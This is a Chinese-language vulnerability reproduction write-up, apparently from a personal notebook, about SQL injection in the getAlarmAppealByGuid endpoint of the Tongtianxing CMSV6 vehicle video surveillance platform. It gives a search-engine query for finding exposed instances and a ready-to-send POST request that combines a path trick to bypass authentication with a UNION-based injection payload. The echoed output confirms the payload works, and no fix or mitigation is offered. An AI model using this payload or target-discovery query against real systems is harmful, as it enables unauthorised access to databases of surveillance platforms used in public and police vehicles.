# 通天星CMSV6车载视频监控平台 getAlarmAppealByGuid存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台getAlarmAppealByGuid存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/lnRXUcYiC0A3P_mY/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-410488.png)

# 四、漏洞复现
```rust
POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1
Host: 192.168.31.228
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded

guid=1') UNION ALL SELECT NULL,CONCAT(0x7178786a71,0x4878597253544d464658514545495671627943586f73584f5056504164416342614549794a446b45,0x71717a7671),NULL-- -
```

![1717263406398-da903405-30a5-4b1d-9f7a-d357e304e250.png](./img/lnRXUcYiC0A3P_mY/1717263406398-da903405-30a5-4b1d-9f7a-d357e304e250-477232.png)

```rust
qxxjqHxYrSTMFFXQEEIVqbyCXosXOPVPAdAcBaEIyJDkEqqzvq
```

```rust
POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1
Host: 192.168.31.228
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded

guid=1
```

![1717263425891-e939657e-86f6-492b-baff-4047d8ab502a.png](./img/lnRXUcYiC0A3P_mY/1717263425891-e939657e-86f6-492b-baff-4047d8ab502a-078476.png)



> 更新: 2024-12-28 13:05:34  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bowy6gf658mit37a>